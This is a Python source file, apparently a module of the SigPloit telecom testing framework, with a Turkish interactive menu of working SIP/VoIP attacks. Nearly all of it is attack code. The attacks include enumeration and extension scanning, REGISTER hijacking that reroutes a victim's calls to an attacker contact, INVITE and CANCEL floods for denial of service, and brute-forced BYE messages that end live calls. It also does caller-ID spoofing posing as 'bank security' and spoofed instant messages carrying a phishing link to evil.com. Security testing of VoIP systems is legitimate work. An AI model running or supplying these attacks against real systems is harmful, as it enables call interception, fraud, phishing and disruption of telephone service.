#!/usr/bin/env python
"""
SIP (Session Initiation Protocol) Attack Module for SigPloit
Implements full SIP-based attacks for VoIP/IMS security testing.

SIP uses UDP/TCP on port 5060 (plain) or 5061 (TLS).
"""
import sys
import os
import socket
import random
import time
import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed


def get_input(prompt, default=None):
    """Get user input with optional default."""
    if default:
        data = input(f"{prompt} [{default}]: ")
        return data if data else default
    return input(f"{prompt}: ")


def generate_call_id():
    """Generate a random SIP Call-ID."""
    return f"{random.randint(100000000, 999999999)}@sigploit"


def generate_branch():
    """Generate a SIP Via branch parameter."""
    return f"z9hG4bK{random.randint(100000, 999999)}"


def generate_tag():
    """Generate a SIP tag."""
    return str(random.randint(10000, 99999))


# ============================================
# MESSAGE BUILDERS
# ============================================

def build_sip_register(target_ip, target_port, from_uri, to_uri, contact_uri,
                        via_ip="1.2.3.4", expires=3600):
    """Build a SIP REGISTER request."""
    branch = generate_branch()
    call_id = generate_call_id()
    tag = generate_tag()

    msg = (
        f"REGISTER sip:{target_ip}:{target_port} SIP/2.0\r\n"
        f"Via: SIP/2.0/UDP {via_ip}:5060;branch={branch}\r\n"
        f"From: <sip:{from_uri}>;tag={tag}\r\n"
        f"To: <sip:{to_uri}>\r\n"
        f"Call-ID: {call_id}\r\n"
        f"CSeq: 1 REGISTER\r\n"
        f"Contact: <sip:{contact_uri}>\r\n"
        f"Expires: {expires}\r\n"
        f"Max-Forwards: 70\r\n"
        f"User-Agent: SigPloit/1.0\r\n"
        f"Content-Length: 0\r\n"
        f"\r\n"
    )
    return msg


def build_sip_invite(target_ip, target_port, from_uri, to_uri,
                      via_ip="1.2.3.4", sdp_ip="1.2.3.4", display_name=None):
    """Build a SIP INVITE request."""
    branch = generate_branch()
    call_id = generate_call_id()
    tag = generate_tag()

    sdp = (
        f"v=0\r\n"
        f"o=sigploit 1234 5678 IN IP4 {sdp_ip}\r\n"
        f"s=SigPloit Call\r\n"
        f"c=IN IP4 {sdp_ip}\r\n"
        f"t=0 0\r\n"
        f"m=audio 8000 RTP/AVP 0 8 101\r\n"
        f"a=rtpmap:0 PCMU/8000\r\n"
        f"a=rtpmap:8 PCMA/8000\r\n"
        f"a=rtpmap:101 telephone-event/8000\r\n"
    )

    from_header = f'"{display_name}" <sip:{from_uri}>' if display_name else f"<sip:{from_uri}>"

    msg = (
        f"INVITE sip:{to_uri}@{target_ip}:{target_port} SIP/2.0\r\n"
        f"Via: SIP/2.0/UDP {via_ip}:5060;branch={branch}\r\n"
        f"From: {from_header};tag={tag}\r\n"
        f"To: <sip:{to_uri}@{target_ip}>\r\n"
        f"Call-ID: {call_id}\r\n"
        f"CSeq: 1 INVITE\r\n"
        f"Contact: <sip:{from_uri}>\r\n"
        f"Max-Forwards: 70\r\n"
        f"User-Agent: SigPloit/1.0\r\n"
        f"Content-Type: application/sdp\r\n"
        f"Content-Length: {len(sdp)}\r\n"
        f"\r\n"
        f"{sdp}"
    )
    return msg, call_id, tag


def build_sip_options(target_ip, target_port, via_ip="1.2.3.4"):
    """Build a SIP OPTIONS request for enumeration."""
    branch = generate_branch()
    call_id = generate_call_id()

    msg = (
        f"OPTIONS sip:{target_ip}:{target_port} SIP/2.0\r\n"
        f"Via: SIP/2.0/UDP {via_ip}:5060;branch={branch}\r\n"
        f"From: <sip:scanner@sigploit.local>;tag={generate_tag()}\r\n"
        f"To: <sip:{target_ip}:{target_port}>\r\n"
        f"Call-ID: {call_id}\r\n"
        f"CSeq: 1 OPTIONS\r\n"
        f"Max-Forwards: 70\r\n"
        f"Accept: application/sdp\r\n"
        f"Content-Length: 0\r\n"
        f"\r\n"
    )
    return msg


def build_sip_bye(target_ip, target_port, call_id, from_uri, to_uri, from_tag, to_tag=None, via_ip="1.2.3.4"):
    """Build a SIP BYE request to terminate a call."""
    branch = generate_branch()

    to_header = f"<sip:{to_uri}@{target_ip}>"
    if to_tag:
        to_header += f";tag={to_tag}"

    msg = (
        f"BYE sip:{to_uri}@{target_ip}:{target_port} SIP/2.0\r\n"
        f"Via: SIP/2.0/UDP {via_ip}:5060;branch={branch}\r\n"
        f"From: <sip:{from_uri}>;tag={from_tag}\r\n"
        f"To: {to_header}\r\n"
        f"Call-ID: {call_id}\r\n"
        f"CSeq: 2 BYE\r\n"
        f"Max-Forwards: 70\r\n"
        f"User-Agent: SigPloit/1.0\r\n"
        f"Content-Length: 0\r\n"
        f"\r\n"
    )
    return msg


def build_sip_cancel(target_ip, target_port, call_id, from_uri, to_uri, from_tag, via_ip="1.2.3.4", via_branch=None):
    """Build a SIP CANCEL request."""
    branch = via_branch or generate_branch()

    msg = (
        f"CANCEL sip:{to_uri}@{target_ip}:{target_port} SIP/2.0\r\n"
        f"Via: SIP/2.0/UDP {via_ip}:5060;branch={branch}\r\n"
        f"From: <sip:{from_uri}>;tag={from_tag}\r\n"
        f"To: <sip:{to_uri}@{target_ip}>\r\n"
        f"Call-ID: {call_id}\r\n"
        f"CSeq: 1 CANCEL\r\n"
        f"Max-Forwards: 70\r\n"
        f"Content-Length: 0\r\n"
        f"\r\n"
    )
    return msg


def build_sip_message(target_ip, target_port, from_uri, to_uri, body, via_ip="1.2.3.4"):
    """Build a SIP MESSAGE request (instant messaging)."""
    branch = generate_branch()
    call_id = generate_call_id()
    tag = generate_tag()

    msg = (
        f"MESSAGE sip:{to_uri}@{target_ip}:{target_port} SIP/2.0\r\n"
        f"Via: SIP/2.0/UDP {via_ip}:5060;branch={branch}\r\n"
        f"From: <sip:{from_uri}>;tag={tag}\r\n"
        f"To: <sip:{to_uri}@{target_ip}>\r\n"
        f"Call-ID: {call_id}\r\n"
        f"CSeq: 1 MESSAGE\r\n"
        f"Max-Forwards: 70\r\n"
        f"Content-Type: text/plain\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"\r\n"
        f"{body}"
    )
    return msg


# ============================================
# NETWORK FUNCTIONS
# ============================================

def send_sip_message_net(target_ip, target_port, message, timeout=5, proto="udp"):
    """Send a SIP message and return the response."""
    sock = None
    try:
        if proto == "tcp":
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((target_ip, target_port))
            sock.send(message.encode())
            data = sock.recv(4096)
            return data.decode('utf-8', errors='ignore'), (target_ip, target_port)
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(timeout)
            sock.sendto(message.encode(), (target_ip, target_port))
            data, addr = sock.recvfrom(4096)
            return data.decode('utf-8', errors='ignore'), addr
    except socket.timeout:
        return None, None
    except Exception as e:
        return str(e), None
    finally:
        if sock:
            try:
                sock.close()
            except Exception:
                pass


def parse_sip_response(response):
    """Parse SIP response and extract key fields."""
    if not response:
        return None

    result = {
        'status_line': '',
        'status_code': 0,
        'headers': {},
        'server': '',
        'allow': '',
        'to_tag': '',
        'contact': '',
        'www_authenticate': '',
    }

    lines = response.split('\r\n')
    if not lines:
        lines = response.split('\n')
    if not lines:
        return result

    result['status_line'] = lines[0]
    parts = lines[0].split(' ', 2)
    if len(parts) >= 2:
        try:
            result['status_code'] = int(parts[1])
        except ValueError:
            pass

    for line in lines[1:]:
        if ':' in line:
            key, _, value = line.partition(':')
            key = key.strip().lower()
            value = value.strip()
            result['headers'][key] = value

            if key == 'server':
                result['server'] = value
            elif key == 'user-agent':
                result['server'] = value
            elif key == 'allow':
                result['allow'] = value
            elif key == 'to':
                if 'tag=' in value:
                    result['to_tag'] = value.split('tag=')[-1].split(';')[0]
            elif key == 'contact':
                result['contact'] = value
            elif key == 'www-authenticate':
                result['www_authenticate'] = value

    return result


SIP_STATUS_CODES = {
    100: "Trying",
    180: "Ringing",
    183: "Session Progress",
    200: "OK",
    301: "Moved Permanently",
    302: "Moved Temporarily",
    400: "Bad Request",
    401: "Unauthorized",
    403: "Forbidden",
    404: "Not Found",
    405: "Method Not Allowed",
    407: "Proxy Authentication Required",
    408: "Request Timeout",
    480: "Temporarily Unavailable",
    481: "Call/Transaction Does Not Exist",
    486: "Busy Here",
    487: "Request Terminated",
    488: "Not Acceptable Here",
    500: "Server Internal Error",
    501: "Not Implemented",
    503: "Service Unavailable",
    603: "Decline",
}


def _log_sip_result(ip, port, attack_type, status_code, details=""):
    """Log SIP attack result to file."""
    try:
        ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open("sip_results.txt", "a", encoding="utf-8") as f:
            f.write(f"[{ts}] {attack_type} -> {ip}:{port} | Status={status_code} | {details}\n")
    except Exception:
        pass


# ============================================
# ATTACK FUNCTIONS
# ============================================

def sip_enumerate():
    """SIP sunucu kesfetme (OPTIONS)."""
    print("\n" + "=" * 50)
    print(" SIP Kesfetme (OPTIONS)")
    print(" SIP sunucu yeteneklerini ogrenme")
    print("=" * 50 + "\n")

    target_ip = get_input("Hedef SIP Sunucu IP", "10.0.0.1")
    target_port = int(get_input("Hedef Port", "5060"))

    print(f"\n[+] {target_ip}:{target_port} adresine SIP OPTIONS gonderiliyor...")

    msg = build_sip_options(target_ip, target_port)
    response, addr = send_sip_message_net(target_ip, target_port, msg)

    if response:
        parsed = parse_sip_response(response)
        print(f"\n[+] Yanit: {parsed['status_line']}")
        if parsed['server']:
            print(f"[+] Sunucu: {parsed['server']}")
        if parsed['allow']:
            print(f"[+] Izin Verilen Metodlar: {parsed['allow']}")
        if parsed['contact']:
            print(f"[+] Contact: {parsed['contact']}")

        print(f"\n[+] Tam Yanit:")
        print("-" * 40)
        for line in response.split('\r\n')[:15]:
            print(f"  {line}")

        _log_sip_result(target_ip, target_port, "OPTIONS", parsed['status_code'], parsed['server'])
    else:
        print("[-] Yanit yok (zaman asimi)")

    input("\nDevam etmek icin Enter'a basin...")


def sip_number_scan():
    """SIP numara tarama - Aktif numaralari bulma."""
    print("\n" + "=" * 50)
    print(" SIP Numara Tarama (Enumeration)")
    print(" Belirtilen araliktaki aktif numaralari bulma")
    print("=" * 50 + "\n")

    target_ip = get_input("Hedef SIP Sunucu IP", "10.0.0.1")
    target_port = int(get_input("Hedef Port", "5060"))
    prefix = get_input("Numara Oneki (orn: 100)", "100")
    start = int(get_input("Baslangic (orn: 0)", "0"))
    end = int(get_input("Bitis (orn: 99)", "99"))
    threads = int(get_input("Thread sayisi", "10"))

    total = end - start + 1
    print(f"\n[+] {total} numara taranacak: {prefix}{start} - {prefix}{end}")
    print(f"[+] Tarama basliyor...\n")

    found = []
    scanned = [0]

    def scan_number(num):
        ext = f"{prefix}{num}"
        msg = build_sip_options(target_ip, target_port)
        # Replace To header with extension
        msg = msg.replace(
            f"To: <sip:{target_ip}:{target_port}>",
            f"To: <sip:{ext}@{target_ip}>"
        )
        resp, _ = send_sip_message_net(target_ip, target_port, msg, timeout=3)
        scanned[0] += 1
        if resp:
            parsed = parse_sip_response(resp)
            return (ext, parsed['status_code'], parsed.get('server', ''))
        return (ext, 0, 'timeout')

    try:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(scan_number, i): i for i in range(start, end + 1)}

            for future in as_completed(futures):
                ext, code, info = future.result()
                if code == 200:
                    found.append(ext)
                    print(f"  \033[32m[+] {ext}: AKTIF (200 OK)\033[0m")
                elif code == 401 or code == 407:
                    found.append(ext)
                    print(f"  \033[33m[+] {ext}: MEVCUT (Auth gerekli - {code})\033[0m")
                elif code == 404:
                    pass  # Not found - skip
                elif code > 0:
                    print(f"  [*] {ext}: {code} {SIP_STATUS_CODES.get(code, '')}")

                if scanned[0] % 20 == 0:
                    sys.stdout.write(f"\r  Tarama: {scanned[0]}/{total}")
                    sys.stdout.flush()
    except KeyboardInterrupt:
        print("\n[!] Kullanici tarafindan durduruldu.")

    print(f"\n\n[+] Tarama tamamlandi: {scanned[0]}/{total}")
    print(f"[+] Bulunan aktif numara: {len(found)}")

    if found:
        fname = f"sip_numbers_{target_ip}.txt"
        with open(fname, "w") as f:
            for ext in found:
                f.write(f"{ext}\n")
        print(f"[+] Sonuclar kaydedildi: {fname}")

    input("\nDevam etmek icin Enter'a basin...")


def sip_register_spoof():
    """SIP REGISTER Spoofing - Kayit ele gecirme."""
    print("\n" + "=" * 50)
    print(" SIP REGISTER Spoofing")
    print(" Hedefin SIP Kaydini Ele Gecirme")
    print("=" * 50 + "\n")

    print("\033[33m[!] UYARI: Bu saldiri hedefin SIP kaydini ele gecirir!\033[0m\n")

    target_ip = get_input("Hedef SIP Proxy IP", "10.0.0.1")
    target_port = int(get_input("Hedef Port", "5060"))
    victim_uri = get_input("Kurban SIP URI (orn: user@domain.com)", "victim@target.com")
    attacker_contact = get_input("Sizin Contact URI (aramalar nereye gitsin)", "attacker@evil.com")
    expires = int(get_input("Kayit Suresi (saniye)", "3600"))

    print(f"\n[+] REGISTER mesaji hazirlaniyor...")
    msg = build_sip_register(target_ip, target_port, victim_uri, victim_uri,
                              attacker_contact, expires=expires)

    print(f"[+] Spoofed REGISTER:")
    print("-" * 40)
    for line in msg.split('\r\n')[:10]:
        print(f"  {line}")

    print(f"\n[+] {target_ip}:{target_port} adresine gonderiliyor...")
    response, addr = send_sip_message_net(target_ip, target_port, msg)

    if response:
        parsed = parse_sip_response(response)
        print(f"\n[+] Yanit: {parsed['status_line']}")
        if parsed['status_code'] == 200:
            print("\033[31m[+] Kayit KABUL EDILDI! Aramalar sizin adresinize yonlendirilecek.\033[0m")
        elif parsed['status_code'] == 401:
            print("[-] Kimlik Dogrulama Gerekli (401)")
            if parsed['www_authenticate']:
                print(f"    WWW-Authenticate: {parsed['www_authenticate']}")
        elif parsed['status_code'] == 403:
            print("[-] Yasaklandi (403) - Spoofing tespit edildi")
        else:
            print(f"[*] Durum: {parsed['status_code']} {SIP_STATUS_CODES.get(parsed['status_code'], '')}")

        _log_sip_result(target_ip, target_port, "REGISTER_SPOOF", parsed['status_code'])
    else:
        print("[-] Yanit yok (zaman asimi)")

    input("\nDevam etmek icin Enter'a basin...")


def sip_invite_flood():
    """SIP INVITE Flood - DoS saldirisi."""
    print("\n" + "=" * 50)
    print(" SIP INVITE Flood (DoS)")
    print(" Hedefi arama istekleriyle bogma")
    print("=" * 50 + "\n")

    print("\033[31m[!] UYARI: Bu bir DoS saldirisidir!\033[0m\n")

    target_ip = get_input("Hedef SIP Sunucu IP", "10.0.0.1")
    target_port = int(get_input("Hedef Port", "5060"))
    from_uri = get_input("From URI (sahte arayan)", "attacker@evil.com")
    to_uri = get_input("To URI (hedef dahili)", "100")
    count = int(get_input("INVITE sayisi", "100"))
    delay = float(get_input("Paketler arasi bekleme (saniye)", "0.01"))

    print(f"\n[+] {count} INVITE paketi {target_ip}:{target_port} adresine gonderiliyor...")

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sent = 0
    errors = 0

    try:
        for i in range(count):
            msg, _, _ = build_sip_invite(target_ip, target_port, from_uri, to_uri)
            try:
                sock.sendto(msg.encode(), (target_ip, target_port))
                sent += 1
            except Exception:
                errors += 1

            if (i + 1) % 10 == 0:
                sys.stdout.write(f"\r[+] Gonderilen: {sent}/{count} (Hata: {errors})")
                sys.stdout.flush()

            if delay > 0:
                time.sleep(delay)
    except KeyboardInterrupt:
        print("\n[!] Kullanici tarafindan durduruldu.")

    sock.close()
    print(f"\n\n[+] Tamamlandi: {sent} paket gonderildi, {errors} hata")
    _log_sip_result(target_ip, target_port, "INVITE_FLOOD", 0, f"sent={sent}")

    input("\nDevam etmek icin Enter'a basin...")


def sip_caller_id_spoof():
    """SIP Caller-ID Spoofing - Sahte numara ile arama."""
    print("\n" + "=" * 50)
    print(" SIP Caller-ID Spoofing")
    print(" Sahte arayan kimligi ile arama baslatma")
    print("=" * 50 + "\n")

    target_ip = get_input("Hedef SIP Sunucu IP", "10.0.0.1")
    target_port = int(get_input("Hedef Port", "5060"))
    spoofed_number = get_input("Sahte Arayan Numara", "+905551234567")
    spoofed_name = get_input("Sahte Arayan Isim", "Banka Guvenlik")
    to_uri = get_input("Hedef Dahili/Numara", "100")

    print(f"\n[+] Spoofed INVITE hazirlaniyor...")
    msg, call_id, tag = build_sip_invite(
        target_ip, target_port,
        f'{spoofed_number}@{target_ip}', to_uri,
        display_name=spoofed_name
    )

    print(f"[+] Arayan Kimlik: {spoofed_name} ({spoofed_number})")
    print(f"[+] Hedef: {to_uri}")

    print(f"\n[+] {target_ip}:{target_port} adresine gonderiliyor...")
    response, addr = send_sip_message_net(target_ip, target_port, msg)

    if response:
        parsed = parse_sip_response(response)
        print(f"\n[+] Yanit: {parsed['status_line']}")
        if parsed['status_code'] in [100, 180, 183, 200]:
            print("\033[32m[+] Arama isleniyor!\033[0m")
            if parsed['status_code'] == 180:
                print("[+] Hedef caliyor...")
        elif parsed['status_code'] == 403:
            print("[-] Yasaklandi - Caller-ID dogrulamasi aktif")
        elif parsed['status_code'] == 404:
            print("[-] Hedef bulunamadi")

        _log_sip_result(target_ip, target_port, "CALLERID_SPOOF", parsed['status_code'],
                         f"from={spoofed_number} to={to_uri}")
    else:
        print("[-] Yanit yok (zaman asimi)")

    input("\nDevam etmek icin Enter'a basin...")


def sip_bye_attack():
    """SIP BYE Attack - Aktif gorusmeleri sonlandirma."""
    print("\n" + "=" * 50)
    print(" SIP BYE Saldirisi")
    print(" Aktif gorusmeleri sahte BYE ile sonlandirma")
    print("=" * 50 + "\n")

    print("\033[31m[!] UYARI: Bu saldiri aktif gorusmeleri keser!\033[0m\n")

    target_ip = get_input("Hedef SIP Sunucu IP", "10.0.0.1")
    target_port = int(get_input("Hedef Port", "5060"))

    print("\nYontem secin:")
    print("  1) Bilinen Call-ID ile sonlandirma")
    print("  2) Brute-force Call-ID deneme")
    method = get_input("Yontem", "2")

    if method == "1":
        call_id = get_input("Call-ID")
        from_uri = get_input("From URI", "user@target.com")
        to_uri = get_input("To URI", "user2@target.com")
        from_tag = get_input("From Tag", generate_tag())
        to_tag = get_input("To Tag (bos birakilabilir)", "")

        bye = build_sip_bye(target_ip, target_port, call_id, from_uri, to_uri,
                             from_tag, to_tag if to_tag else None)

        print(f"\n[+] BYE gonderiliyor...")
        response, addr = send_sip_message_net(target_ip, target_port, bye)

        if response:
            parsed = parse_sip_response(response)
            print(f"[+] Yanit: {parsed['status_line']}")
            if parsed['status_code'] == 200:
                print("\033[31m[+] Gorusme sonlandirildi!\033[0m")
            elif parsed['status_code'] == 481:
                print("[-] Gorusme bulunamadi (481)")
        else:
            print("[-] Yanit yok")
    else:
        from_uri = get_input("From URI", "user@target.com")
        to_uri = get_input("To URI", "user2@target.com")
        count = int(get_input("Deneme sayisi", "100"))

        print(f"\n[+] {count} rastgele Call-ID ile BYE deneniyor...")
        success = 0
        for i in range(count):
            fake_call_id = f"{random.randint(100000000, 999999999)}@{target_ip}"
            bye = build_sip_bye(target_ip, target_port, fake_call_id, from_uri, to_uri,
                                 generate_tag())
            response, _ = send_sip_message_net(target_ip, target_port, bye, timeout=2)

            if response:
                parsed = parse_sip_response(response)
                if parsed['status_code'] == 200:
                    success += 1
                    print(f"\033[31m  [+] Gorusme sonlandirildi! Call-ID: {fake_call_id}\033[0m")

            if (i + 1) % 10 == 0:
                sys.stdout.write(f"\r  Deneme: {i+1}/{count} | Basarili: {success}")
                sys.stdout.flush()

        print(f"\n\n[+] Tamamlandi: {success}/{count} gorusme sonlandirildi")

    _log_sip_result(target_ip, target_port, "BYE_ATTACK", 0)
    input("\nDevam etmek icin Enter'a basin...")


def sip_message_spoof():
    """SIP MESSAGE - Sahte mesaj gonderme."""
    print("\n" + "=" * 50)
    print(" SIP MESSAGE Spoofing")
    print(" Sahte kimlikle anlik mesaj gonderme")
    print("=" * 50 + "\n")

    target_ip = get_input("Hedef SIP Sunucu IP", "10.0.0.1")
    target_port = int(get_input("Hedef Port", "5060"))
    from_uri = get_input("Gonderen (sahte)", "boss@company.com")
    to_uri = get_input("Alici", "employee@company.com")
    body = get_input("Mesaj icerigi", "Lutfen sifrenizi guncelleyin: http://evil.com")

    print(f"\n[+] MESSAGE hazirlaniyor...")
    msg = build_sip_message(target_ip, target_port, from_uri, to_uri, body)

    print(f"[+] {target_ip}:{target_port} adresine gonderiliyor...")
    response, addr = send_sip_message_net(target_ip, target_port, msg)

    if response:
        parsed = parse_sip_response(response)
        print(f"\n[+] Yanit: {parsed['status_line']}")
        if parsed['status_code'] == 200:
            print("\033[32m[+] Mesaj iletildi!\033[0m")
        elif parsed['status_code'] == 202:
            print("\033[32m[+] Mesaj kabul edildi (202 Accepted).\033[0m")
    else:
        print("[-] Yanit yok (zaman asimi)")

    _log_sip_result(target_ip, target_port, "MESSAGE_SPOOF", 0, f"from={from_uri} to={to_uri}")
    input("\nDevam etmek icin Enter'a basin...")


def sip_cancel_attack():
    """SIP CANCEL - Gelen aramalari iptal etme."""
    print("\n" + "=" * 50)
    print(" SIP CANCEL Saldirisi")
    print(" Gelen aramalari sahte CANCEL ile iptal etme")
    print("=" * 50 + "\n")

    target_ip = get_input("Hedef SIP Sunucu IP", "10.0.0.1")
    target_port = int(get_input("Hedef Port", "5060"))
    from_uri = get_input("Arayan URI", "caller@domain.com")
    to_uri = get_input("Hedef URI", "victim@target.com")
    count = int(get_input("CANCEL sayisi", "50"))

    print(f"\n[+] {count} CANCEL gonderiliyor...")
    sent = 0

    for i in range(count):
        call_id = generate_call_id()
        tag = generate_tag()
        cancel = build_sip_cancel(target_ip, target_port, call_id, from_uri, to_uri, tag)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(cancel.encode(), (target_ip, target_port))
            sock.close()
            sent += 1
        except Exception:
            pass

        if (i + 1) % 10 == 0:
            sys.stdout.write(f"\r[+] Gonderilen: {sent}/{count}")
            sys.stdout.flush()

    print(f"\n[+] Tamamlandi: {sent} CANCEL gonderildi")
    _log_sip_result(target_ip, target_port, "CANCEL_ATTACK", 0, f"sent={sent}")
    input("\nDevam etmek icin Enter'a basin...")


def sip_batch_test():
    """Toplu SIP guvenlik testi."""
    print("\n" + "=" * 50)
    print(" SIP Toplu Guvenlik Testi")
    print(" Tum SIP saldiri turlerini otomatik deneme")
    print("=" * 50 + "\n")

    target_ip = get_input("Hedef SIP Sunucu IP", "10.0.0.1")
    target_port = int(get_input("Hedef Port", "5060"))

    tests = []

    # Test 1: OPTIONS
    print("\n[1/5] OPTIONS testi...")
    msg = build_sip_options(target_ip, target_port)
    resp, _ = send_sip_message_net(target_ip, target_port, msg, timeout=3)
    if resp:
        parsed = parse_sip_response(resp)
        tests.append(("OPTIONS", parsed['status_code'], parsed.get('server', '')))
        print(f"  Sonuc: {parsed['status_code']} | Sunucu: {parsed.get('server', 'N/A')}")
    else:
        tests.append(("OPTIONS", 0, "timeout"))
        print("  Sonuc: Zaman asimi")

    # Test 2: REGISTER (no auth)
    print("[2/5] REGISTER testi...")
    msg = build_sip_register(target_ip, target_port, "test@sigploit", "test@sigploit", "test@1.2.3.4")
    resp, _ = send_sip_message_net(target_ip, target_port, msg, timeout=3)
    if resp:
        parsed = parse_sip_response(resp)
        tests.append(("REGISTER", parsed['status_code'], ''))
        print(f"  Sonuc: {parsed['status_code']} {SIP_STATUS_CODES.get(parsed['status_code'], '')}")
        if parsed['status_code'] == 200:
            print("  \033[31m[!] ZAFIYET: Auth olmadan kayit kabul ediliyor!\033[0m")
    else:
        tests.append(("REGISTER", 0, "timeout"))
        print("  Sonuc: Zaman asimi")

    # Test 3: INVITE (caller-id)
    print("[3/5] INVITE (Caller-ID spoof) testi...")
    msg, _, _ = build_sip_invite(target_ip, target_port, "spoofed@evil.com", "100",
                                  display_name="Sahte Isim")
    resp, _ = send_sip_message_net(target_ip, target_port, msg, timeout=3)
    if resp:
        parsed = parse_sip_response(resp)
        tests.append(("INVITE/CallerID", parsed['status_code'], ''))
        print(f"  Sonuc: {parsed['status_code']} {SIP_STATUS_CODES.get(parsed['status_code'], '')}")
        if parsed['status_code'] in [100, 180, 183, 200]:
            print("  \033[31m[!] ZAFIYET: Sahte Caller-ID kabul ediliyor!\033[0m")
    else:
        tests.append(("INVITE/CallerID", 0, "timeout"))
        print("  Sonuc: Zaman asimi")

    # Test 4: BYE (random)
    print("[4/5] BYE testi...")
    bye = build_sip_bye(target_ip, target_port, generate_call_id(), "a@b", "c@d", generate_tag())
    resp, _ = send_sip_message_net(target_ip, target_port, bye, timeout=3)
    if resp:
        parsed = parse_sip_response(resp)
        tests.append(("BYE", parsed['status_code'], ''))
        print(f"  Sonuc: {parsed['status_code']} {SIP_STATUS_CODES.get(parsed['status_code'], '')}")
    else:
        tests.append(("BYE", 0, "timeout"))
        print("  Sonuc: Zaman asimi")

    # Test 5: MESSAGE
    print("[5/5] MESSAGE testi...")
    msg = build_sip_message(target_ip, target_port, "test@sig", "test@target", "test")
    resp, _ = send_sip_message_net(target_ip, target_port, msg, timeout=3)
    if resp:
        parsed = parse_sip_response(resp)
        tests.append(("MESSAGE", parsed['status_code'], ''))
        print(f"  Sonuc: {parsed['status_code']} {SIP_STATUS_CODES.get(parsed['status_code'], '')}")
    else:
        tests.append(("MESSAGE", 0, "timeout"))
        print("  Sonuc: Zaman asimi")

    # Summary
    print("\n" + "=" * 60)
    print(" SIP GUVENLIK TEST SONUCLARI")
    print("=" * 60)
    for name, code, info in tests:
        if code == 200:
            color = "\033[31m"
            status = "ACIK/ZAFIYET"
        elif code in [401, 403, 407]:
            color = "\033[32m"
            status = "KORUMALI"
        elif code == 0:
            color = "\033[37m"
            status = "YANIT YOK"
        else:
            color = "\033[33m"
            status = f"KOD={code}"
        print(f"  {name:20s}: {color}{status}\033[0m {info}")
    print("=" * 60)

    # Save
    try:
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        fname = f"sip_batch_{ts}.txt"
        with open(fname, "w", encoding="utf-8") as f:
            f.write(f"SIP Toplu Test - {target_ip}:{target_port}\nTarih: {ts}\n\n")
            for name, code, info in tests:
                f.write(f"{name}: {code} {info}\n")
        print(f"\n[+] Sonuclar kaydedildi: {fname}")
    except Exception:
        pass

    input("\nDevam etmek icin Enter'a basin...")


# ============================================
# MENU
# ============================================

def sip_menu():
    """SIP saldiri ana menusu."""
    os.system('cls' if os.name == 'nt' else 'clear')

    print("=" * 60)
    print(" SIP Protokol Saldirilari (VoIP/IMS)")
    print("=" * 60)
    print()
    print("  Saldiri                  Aciklama")
    print("  --------                 --------------------")
    print("  0) SIP Kesfetme          OPTIONS ile sunucu bilgisi")
    print("  1) Numara Tarama         Aktif dahilileri bulma")
    print("  2) Kayit Ele Gecirme     REGISTER spoofing")
    print("  3) INVITE Flood          DoS saldirisi")
    print("  4) Caller-ID Spoof       Sahte numara ile arama")
    print("  5) BYE Saldirisi         Gorusmeleri sonlandirma")
    print("  6) Mesaj Spoofing        Sahte SIP mesaj gonderme")
    print("  7) CANCEL Saldirisi      Gelen aramalari iptal etme")
    print("  8) Toplu Test            Tum testleri otomatik calistir")
    print()
    print("  Geri donmek icin 'back' yazin")
    print()

    choice = input("\033[37m(\033[0m\033[2;31msip\033[0m\033[37m)>\033[0m ")

    if choice == "0":
        sip_enumerate()
        sip_menu()
    elif choice == "1":
        sip_number_scan()
        sip_menu()
    elif choice == "2":
        sip_register_spoof()
        sip_menu()
    elif choice == "3":
        sip_invite_flood()
        sip_menu()
    elif choice == "4":
        sip_caller_id_spoof()
        sip_menu()
    elif choice == "5":
        sip_bye_attack()
        sip_menu()
    elif choice == "6":
        sip_message_spoof()
        sip_menu()
    elif choice == "7":
        sip_cancel_attack()
        sip_menu()
    elif choice == "8":
        sip_batch_test()
        sip_menu()
    elif choice == "back" or choice == "geri":
        return
    else:
        print('\n\033[31m[-]Hata:\033[0m Gecerli bir secim yapin (0-8)')
        time.sleep(1.5)
        sip_menu()


if __name__ == "__main__":
    sip_menu()
